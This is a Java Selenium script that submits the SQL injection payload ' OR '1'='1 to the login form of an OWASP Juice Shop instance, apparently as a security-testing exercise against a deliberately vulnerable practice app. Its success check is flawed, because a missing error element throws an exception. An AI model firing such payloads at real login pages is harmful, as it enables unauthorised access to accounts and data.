// Import necessary Selenium and WebDriver packages
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

public class SQLInjectionTest {
    public static void main(String[] args) {
        // Set the path to the ChromeDriver executable
        System.setProperty("webdriver.chrome.driver", "path/to/chromedriver");

        // Create a new instance of the Chrome driver
        WebDriver driver = new ChromeDriver();

        try {
            // Navigate to the OWASP Juice Shop login page
            driver.get("https://juice-shop.herokuapp.com/w/login");

            // Maximize the browser window
            driver.manage().window().maximize();

            // Locate the username and password fields using their respective IDs
            WebElement usernameField = driver.findElement(By.id("email"));
            WebElement passwordField = driver.findElement(By.id("password"));

            // Crafted SQL injection string as the username
            String maliciousUsername = "' OR '1'='1";

            // A valid password (assuming 'password' is valid for the controlled environment)
            String validPassword = "password";

            // Enter the malicious username and valid password into the respective fields
            usernameField.sendKeys(maliciousUsername);
            passwordField.sendKeys(validPassword);

            // Locate and click the login button to submit the form
            WebElement loginButton = driver.findElement(By.id("loginButton"));
            loginButton.click();

            // Pause briefly to allow the page to load and respond
            Thread.sleep(3000);

            // Check for any error messages or changes in the URL to determine the result of the SQL injection attempt
            WebElement errorMessage = driver.findElement(By.cssSelector(".error"));
            if (errorMessage.isDisplayed()) {
                System.out.println("SQL Injection Attempt Failed: " + errorMessage.getText());
            } else {
                System.out.println("SQL Injection Attempt Might Have Succeeded or No Error Message Detected.");
            }

        } catch (Exception e) {
            System.out.println("An error occurred: " + e.getMessage());
        } finally {
            // Close the browser
            driver.quit();
        }
    }
}
